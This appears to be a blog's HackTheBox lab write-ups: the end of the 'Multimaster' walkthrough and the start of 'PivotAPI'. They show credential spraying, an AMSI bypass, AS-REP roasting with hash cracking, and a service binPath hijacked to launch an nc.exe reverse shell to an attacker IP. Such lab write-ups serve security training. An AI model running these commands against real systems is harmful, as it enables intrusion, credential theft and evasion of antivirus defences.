BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Group used for deny only NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group MEGACORP\\Developers Group S-1-5-21-3167813660-1240564177-918740779-3119 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. Inside we have custom dll C:\\inetpub\\wwwroot\u0026gt;dir bin dir bin Volume in drive C has no label. Volume Serial Number is 7B4A-4B5F Directory of C:\\inetpub\\wwwroot\\bin 01/07/2020 10:28 PM \u0026lt;DIR\u0026gt; . 01/07/2020 10:28 PM \u0026lt;DIR\u0026gt; .. 02/21/2013 08:13 PM 102,912 Antlr3.Runtime.dll 02/21/2013 08:13 PM 431,616 Antlr3.Runtime.pdb 05/24/2018 01:08 AM 40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll 07/24/2012 11:18 PM 45,416 Microsoft.Web.Infrastructure.dll 01/09/2020 05:13 AM 13,824 MultimasterAPI.dll 01/09/2020 05:13 AM 28,160 MultimasterAPI.pdb 02/17/2018 09:14 PM 664,576 Newtonsoft.Json.dll 01/07/2020 10:28 PM \u0026lt;DIR\u0026gt; roslyn 11/28/2018 12:30 AM 178,808 System.Net.Http.Formatting.dll 11/28/2018 12:28 AM 27,768 System.Web.Cors.dll 01/27/2015 03:34 PM 139,976 System.Web.Helpers.dll 11/28/2018 12:31 AM 39,352 System.Web.Http.Cors.dll 11/28/2018 12:31 AM 455,096 System.Web.Http.dll 01/31/2018 11:49 PM 77,520 System.Web.Http.WebHost.dll 01/27/2015 03:32 PM 566,472 System.Web.Mvc.dll 02/11/2014 02:56 AM 70,864 System.Web.Optimization.dll 01/27/2015 03:32 PM 272,072 System.Web.Razor.dll 01/27/2015 03:34 PM 41,672 System.Web.WebPages.Deployment.dll 01/27/2015 03:34 PM 211,656 System.Web.WebPages.dll 01/27/2015 03:34 PM 39,624 System.Web.WebPages.Razor.dll 07/17/2013 04:33 AM 1,276,568 WebGrease.dll 20 File(s) 4,724,032 bytes 3 Dir(s) 6,298,828,800 bytes free └─$ file MultimasterAPI.dll MultimasterAPI.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections We can use dnspy for reversing or Let\u0026rsquo;s just start with the strings We will find the password └─$ strings -el MultimasterAPI.dll \u0026#39;C]v} {{ action = {0}, id = {1} }} {{ id = {0} }} ~/bundles/jquery ~/Scripts/jquery-{version}.js ~/bundles/jqueryval ~/Scripts/jquery.validate* ~/bundles/modernizr ~/Scripts/modernizr-* ~/bundles/bootstrap ~/Scripts/bootstrap.js ~/Content/css ~/Content/bootstrap.css ~/Content/site.css {resource}.axd/{*pathInfo} Default {controller}/{action}/{id} Index DefaultApi api/{controller}/{id} /api/getColleagues UNION SELECT JOIN EXEC ORDER WAITFOR DELAY FROM WHERE LIKE INFORMATION_SCHEMA MASTER { \u0026#34;info\u0026#34; : \u0026#34;MegaCorp API\u0026#34; } application/json server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!; name Select * from Colleagues where name like \u0026#39;%{0}%\u0026#39; ... If we test for password-reuse, we have a hit ─$ crackmapexec smb 10.10.10.179 -u users.list -p \u0026#39;D3veL0pM3nT!\u0026#39; SMB 10.10.10.179 445 MULTIMASTER [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\svc-nas:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\Privileged:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\alice:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\test:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\dai:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\svc-sql:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\SQLServer2005SQLBrowserUser:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [+] MEGACORP.LOCAL\\sbauer:D3veL0pM3nT! sbauer can winrm └─$ evil-winrm -u \u0026#39;MEGACORP\\sbauer\u0026#39; -p \u0026#39;D3veL0pM3nT!\u0026#39; -i 10.10.10.179 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\sbauer\\Documents\u0026gt; User #3 Let\u0026rsquo;s run bloodhound to gather domain information I ran it with tushikikatomo creds before, but had nothing interesting └─$ bloodhound-python -u sbauer -p \u0026#39;D3veL0pM3nT!\u0026#39; -d megacorp.local -dc multimaster.megacorp.local -ns 10.10.10.179 -c ALL --zip INFO: Found AD domain: megacorp.local INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) INFO: Connecting to LDAP server: multimaster.megacorp.local INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: multimaster.megacorp.local INFO: Found 28 users INFO: Found 57 groups INFO: Found 2 gpos INFO: Found 10 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: MULTIMASTER.MEGACORP.LOCAL INFO: Done in 00M 28S INFO: Compressing output into 20231015123725_bloodhound.zip sbauer has GenericWrite over jorden who is a member of Server Operators Server Operators We can either set SPN or make user AS-REP-roastable There is AMSI enabled *Evil-WinRM* PS C:\\programdata\u0026gt; import-module .\\powerview.ps1 At C:\\programdata\\powerview.ps1:1 char:1 + #requires -version 2 + ~~~~~~~~~~~~~~~~~~~~ This script contains malicious content and has been blocked by your antivirus software. At C:\\programdata\\powerview.ps1:1 char:1 + #requires -version 2 + ~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : ScriptContainedMaliciousContent Let\u0026rsquo;s bypass it using evil-winrm *Evil-WinRM* PS C:\\programdata\u0026gt; menu ,. ( . ) \u0026#34; ,. ( . ) . (\u0026#34; ( ) )\u0026#39; ,\u0026#39; (` \u0026#39;` (\u0026#34; ) )\u0026#39; ,\u0026#39; . ,) .; ) \u0026#39; (( (\u0026#34; ) ;(, . ;) \u0026#34; )\u0026#34; .; ) \u0026#39; (( (\u0026#34; ) );(, )(( _\u0026#34;.,_,.__).,) (.._( ._), ) , (._..( \u0026#39;.._\u0026#34;._, . \u0026#39;._)_(..,_(_\u0026#34;.) _( _\u0026#39;) \\_ _____/__ _|__| | (( ( / \\ / \\__| ____\\______ \\ / \\ | __)_\\ \\/ / | | ;_)_\u0026#39;) \\ \\/\\/ / |/ \\| _/ / \\ / \\ | \\\\ /| | |__ /_____/ \\ /| | | \\ | \\/ Y \\ /_______ / \\_/ |__|____/ \\__/\\ / |__|___| /____|_ /\\____|__ / \\/ \\/ \\/ \\/ \\/ By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers [+] Dll-Loader [+] Donut-Loader [+] Invoke-Binary [+] Bypass-4MSI [+] services [+] upload [+] download [+] menu [+] exit *Evil-WinRM* PS C:\\programdata\u0026gt; Bypass-4MSI Info: Patching 4MSI, please be patient... [+] Success! We will set UF_DONT_REQUIRE_PREAUTH http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm *Evil-WinRM* PS C:\\programdata\u0026gt; Get-DomainUser jorden | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 DONT_EXPIRE_PASSWORD 65536 *Evil-WinRM* PS C:\\programdata\u0026gt; Get-DomainUser jorden | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 DONT_EXPIRE_PASSWORD 65536 *Evil-WinRM* PS C:\\programdata\u0026gt; Set-DomainObject -Identity jorden -XOR @{useraccountcontrol=4194304} -Verbose Verbose: [Get-DomainSearcher] search base: LDAP://DC=MEGACORP,DC=LOCAL Verbose: [Get-DomainObject] Get-DomainObject filter string: (\u0026amp;(|(|(samAccountName=jorden)(name=jorden)(displayname=jorden)))) Verbose: [Set-DomainObject] XORing \u0026#39;useraccountcontrol\u0026#39; with \u0026#39;4194304\u0026#39; for object \u0026#39;jorden\u0026#39; *Evil-WinRM* PS C:\\programdata\u0026gt; Get-DomainUser jorden | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 DONT_EXPIRE_PASSWORD 65536 DONT_REQ_PREAUTH 4194304 *Evil-WinRM* PS C:\\programdata\u0026gt; Let\u0026rsquo;s use impacket-GetNPUsers └─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.179 MEGACORP/jorden Impacket v0.11.0 - Copyright 2023 Fortra [*] Getting TGT for jorden $krb5asrep$23$jorden@MEGACORP:b8aa6ac1a239e016faeb9ac1d73f7b59$2535eb23e7361e0851b1098fdbd6af879445a606ea31ba85743ca7a56233efed0a6d4215fc7239368b91f76522fe03d1c91e8fd7da53f58725a413d9a860469fc29f0f5bc804d8600ac4e5c82079adb2851381751d16a4b9b42b37b25c1356cfbf6df694436c57fdcc5b1fc9c444143d1fd67935b77ee3b3bd841e682323454eb68a5080b7ec587244df86d7b1e2911859137501d6c97f5a3fa4f3ed2091854b4235567a4aa8ece93116799738c54c0f59c561522fa8f8576b705320d027d91e90e6d5023d6e849af7662afd36f5d53ba4209a4d8b5e142028a15b6b7e2fdf7dbfe98408c8a32d4cfc9a Crack it using hashcat └─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU ... $krb5asrep$23$jorden@MEGACORP:b8aa6ac1a239e016faeb9ac1d73f7b59$2535eb23e7361e0851b1098fdbd6af879445a606ea31ba85743ca7a56233efed0a6d4215fc7239368b91f76522fe03d1c91e8fd7da53f58725a413d9a860469fc29f0f5bc804d8600ac4e5c82079adb2851381751d16a4b9b42b37b25c1356cfbf6df694436c57fdcc5b1fc9c444143d1fd67935b77ee3b3bd841e682323454eb68a5080b7ec587244df86d7b1e2911859137501d6c97f5a3fa4f3ed2091854b4235567a4aa8ece93116799738c54c0f59c561522fa8f8576b705320d027d91e90e6d5023d6e849af7662afd36f5d53ba4209a4d8b5e142028a15b6b7e2fdf7dbfe98408c8a32d4cfc9a:rainforest786 ... And we have access └─$ evil-winrm -u \u0026#34;MEGACORP\\jorden\u0026#34; -p rainforest786 -i 10.10.10.179 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\jorden\\Documents\u0026gt; Root Since jorden is Server Operator, we can start and stop services Server Operators *Evil-WinRM* PS C:\\Users\\jorden\\Documents\u0026gt; net user jorden User name jorden Full Name Jorden Mclean Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 1/9/2020 5:48:17 PM Password expires Never Password changeable 1/10/2020 5:48:17 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 10/15/2023 6:07:45 AM Logon hours allowed All Local Group Memberships *Remote Management Use*Server Operators Global Group memberships *Domain Users *Developers The command completed successfully. Let\u0026rsquo;s see which services we can edit We can use winpeas or PrivescCheck for that *Evil-WinRM* PS C:\\programdata\u0026gt; Bypass-4MSI Info: Patching 4MSI, please be patient... [+] Success! *Evil-WinRM* PS C:\\programdata\u0026gt; import-module .\\pc.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; Invoke-PrivescCheck +------+------------------------------------------------+------+ | TEST | USER \u0026gt; Identity | INFO | +------+------------------------------------------------+------+ | DESC | Get the full name of the current user (domain + | | | username) along with the associated Security | | | Identifier (SID). | +------+-------------------------------------------------------+ [*] Found 1 result(s). ... +------+------------------------------------------------+------+ | TEST | SERVICES \u0026gt; Service Permissions | VULN | +------+------------------------------------------------+------+ | DESC | Interact with the Service Control Manager (SCM) and | | | check whether the current user can modify any | | | registered service. | +------+-------------------------------------------------------+ [*] Found 394 result(s). ... +------+------------------------------------------------+------+ | TEST | SERVICES \u0026gt; Registry Permissions | VULN | +------+------------------------------------------------+------+ | DESC | Parse the registry and check whether the current user | | | can modify the configuration of any registered | | | service. | +------+-------------------------------------------------------+ [*] Found 197 result(s). ... With trial and error, I found suitable service and modified it\u0026rsquo;s binary path Then had to change start mode to auto, since it was disabled Then we start our listener and start the service *Evil-WinRM* PS C:\\programdata\u0026gt; sc.exe config usosvc binPath=\u0026#34;C:\\programdata\\nc.exe 10.10.16.9 445 -e cmd.exe\u0026#34; [SC] ChangeServiceConfig SUCCESS *Evil-WinRM* PS C:\\programdata\u0026gt; sc.exe config usosvc start=auto [SC] ChangeServiceConfig SUCCESS *Evil-WinRM* PS C:\\programdata\u0026gt; sc.exe start usosvc [SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion. 0xdf shows unintented path in his blog ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/multimaster.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/","summary":"Multimaster Enumeration nmap └─$ nmap -Pn -p- 10.10.10.179 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST Nmap scan report for 10.10.10.179 (10.10.10.179) Host is up (0.13s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman 49666/tcp open unknown 49667/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49678/tcp open unknown 49698/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 45.","tags":["HTB","active-directory","wfuzz","waf","filter","unicode","sqlmap","tamper","hashcat","crackmapexec","python","sqli","injection","windows","mssql","rid","evil-winrm","cef-debugging","reverse-engineering","bloodhound","amsi","powersploit","as-rep-roast","server-operators","service","service-hijack","sebackupprivilege","serestoreprivilege"],"title":"[HTB] Machine: Multimaster"},{"categories":null,"contents":"PivotAPI Enumeration nmap └─$ nmap -Pn -p- 10.10.10.240 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:10 BST Nmap scan report for 10.10.10.240 (10.10.10.240) Host is up (0.10s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49708/tcp open unknown 52843/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds └─$ nmap -Pn -p21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sC -sV 10.10.10.240 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:12 BST Nmap scan report for 10.10.10.240 (10.10.10.240) Host is up (0.10s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-19-21 03:06PM 103106 10.1.1.414.6453.pdf | 02-19-21 03:06PM 656029 28475-linux-stack-based-buffer-overflows.pdf | 02-19-21 12:55PM 1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf | 02-19-21 03:06PM 1018160 ExploitingSoftware-Ch07.pdf | 08-08-20 01:18PM 219091 notes1.pdf | 08-08-20 01:34PM 279445 notes2.pdf | 08-08-20 01:41PM 105 README.txt |_02-19-21 03:06PM 1301120 RHUL-MA-2009-06.pdf 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA) | 256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA) |_ 256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519) 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-05 19:12:42Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp filtered ldap 445/tcp open microsoft-ds? 464/tcp filtered kpasswd5 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-ntlm-info: | 10.10.10.240:1433: | Target_Name: LICORDEBELLOTA | NetBIOS_Domain_Name: LICORDEBELLOTA | NetBIOS_Computer_Name: PIVOTAPI | DNS_Domain_Name: LicorDeBellota.htb | DNS_Computer_Name: PivotAPI.LicorDeBellota.htb | DNS_Tree_Name: LicorDeBellota.htb |_ Product_Version: 10.0.17763 | ms-sql-info: | 10.10.10.240:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-10-05T19:05:41 |_Not valid after: 2053-10-05T19:05:41 |_ssl-date: 2023-10-05T19:13:30+00:00; -7h00m01s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2023-10-05T19:12:54 |_ start_date: N/A |_clock-skew: mean: -7h00m01s, deviation: 0s, median: -7h00m01s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds smb └─$ smbclient -N -L //10.10.10.240 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available dns └─$ dig axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.17-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb ;; global options: +cmd ; Transfer failed. ldapsearch └─$ ldapsearch -H ldap://LicorDeBellota.htb -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=LicorDeBellota,DC=htb namingcontexts: CN=Configuration,DC=LicorDeBellota,DC=htb namingcontexts: CN=Schema,CN=Configuration,DC=LicorDeBellota,DC=htb namingcontexts: DC=DomainDnsZones,DC=LicorDeBellota,DC=htb namingcontexts: DC=ForestDnsZones,DC=LicorDeBellota,DC=htb # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://LicorDeBellota.htb -x -b \u0026#34;DC=LicorDeBellota,DC=htb\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=LicorDeBellota,DC=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 1 No results for rpc ftp └─$ ftp anonymous@10.10.10.240 Connected to 10.10.10.240. 220 Microsoft FTP Service 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||57367|) 150 Opening ASCII mode data connection. 02-19-21 03:06PM 103106 10.1.1.414.6453.pdf 02-19-21 03:06PM 656029 28475-linux-stack-based-buffer-overflows.pdf 02-19-21 12:55PM 1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf 02-19-21 03:06PM 1018160 ExploitingSoftware-Ch07.pdf 08-08-20 01:18PM 219091 notes1.pdf 08-08-20 01:34PM 279445 notes2.pdf 08-08-20 01:41PM 105 README.txt 02-19-21 03:06PM 1301120 RHUL-MA-2009-06.pdf 226 Transfer complete. Running exiftool on pdf files shows LicorDeBellota.htb\\kaorz ======== notes2.pdf ExifTool Version Number : 12.67 File Name : notes2.pdf Directory : . File Size : 279 kB File Modification Date/Time : 2020:08:08 12:34:25+01:00 File Access Date/Time : 2023:10:06 19:12:03+01:00 File Inode Change Date/Time : 2023:10:06 19:12:03+01:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 5 XMP Toolkit : Image::ExifTool 12.03 Creator : Kaorz Publisher : LicorDeBellota.htb Producer : cairo 1.10.2 (http://cairographics.org) Foothold Let\u0026rsquo;s check if user is AS-REP-roastable └─$ impacket-GetNPUsers -dc-ip PivotAPI.LicorDeBellota.htb LicorDeBellota.htb/kaorz -no-pass Impacket v0.11.0 - Copyright 2023 Fortra [*] Getting TGT for kaorz $krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441 Let\u0026rsquo;s crack it kaorz:Roper4155 └─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU ... $krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441:Roper4155 The creds didn\u0026rsquo;t work for ssh └─$ sshpass -p \u0026#39;Roper4155\u0026#39; ssh kaorz@10.10.10.240 Warning: Permanently added \u0026#39;10.10.10.240\u0026#39; (ED25519) to the list of known hosts. Permission denied, please try again. No SPNs └─$ impacket-GetUserSPNs LicorDeBellota.htb/Kaorz:\u0026#39;Roper4155\u0026#39; -dc-ip 10.10.10.240 Impacket v0.11.0 - Copyright 2023 Fortra No entries found! No access to mysql └─$ impacket-mssqlclient LicorDeBellota.htb/Kaorz:\u0026#39;Roper4155\u0026#39;@10.10.10.240 -windows-auth Impacket v0.11.0 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [-] ERROR(PIVOTAPI\\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario \u0026#39;LICORDEBELLOTA\\Kaorz\u0026#39;. User Let\u0026rsquo;s check bloodhound └─$ bloodhound-python -u kaorz -p \u0026#39;Roper4155\u0026#39; -d licordebellota.htb -dc licordebellota.htb -ns 10.10.10.240 --zip INFO: Found AD domain: licordebellota.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: licordebellota.htb INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Found 28 users INFO: Connecting to LDAP server: licordebellota.htb INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 58 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: PivotAPI.LicorDeBellota.htb INFO: Done in 00M 16S INFO: Compressing output into 20231007112624_bloodhound.zip Nothing interesting Domain Users I\u0026rsquo;ll check smb └─$ smbclient -L //10.10.10.240/ -U \u0026#39;kaorz%Roper4155\u0026#39; Sharename Type Comment --------- ---- ------- ADMIN$ Disk Admin remota C$ Disk Recurso predeterminado IPC$ IPC IPC remota NETLOGON Disk Recurso compartido del servidor de inicio de sesión SYSVOL Disk Recurso compartido del servidor de inicio de sesión Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available We have files in Netlogon\\HelpDesk └─$ smbclient //10.10.10.240/NETLOGON -U \u0026#39;kaorz%Roper4155\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Aug 8 11:42:28 2020 .. D 0 Sat Aug 8 11:42:28 2020 HelpDesk D 0 Sun Aug 9 16:40:36 2020 5158399 blocks of size 4096. 1053109 blocks available smb: \\\u0026gt; cd HelpDesk\\ smb: \\HelpDesk\\\u0026gt; ls . D 0 Sun Aug 9 16:40:36 2020 .. D 0 Sun Aug 9 16:40:36 2020 Restart-OracleService.exe A 1854976 Fri Feb 19 10:52:01 2021 Server MSSQL.msg A 24576 Sun Aug 9 12:04:14 2020 WinRM Service.msg A 26112 Sun Aug 9 12:42:20 2020 5158399 blocks of size 4096. 1053109 blocks available Download the files We see msg files, which are Outlook message files We need to install msgconvert via sudo apt-get install libemail-outlook-message-perl https://www.matijs.net/software/msgconv └─$ file *.msg Server MSSQL.msg: CDFV2 Microsoft Outlook Message WinRM Service.msg: CDFV2 Microsoft Outlook Message Run msgconvert Now we have eml files, which we can read └─$ msgconvert *.msg Date: Sun, 09 Aug 2020 11:04:14 +0000 MIME-Version: 1.0 Content-Type: multipart/alternative; boundary=16967873760.dB4b.277836 Content-Transfer-Encoding: 7bit Subject: Server MSSQL To: cybervaca@licordebellota.htb \u0026lt;cybervaca@licordebellota.htb\u0026gt; ... Good afternoon, Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020. Remember that there were problems at the time of restarting the Oracle service and for this reason a program 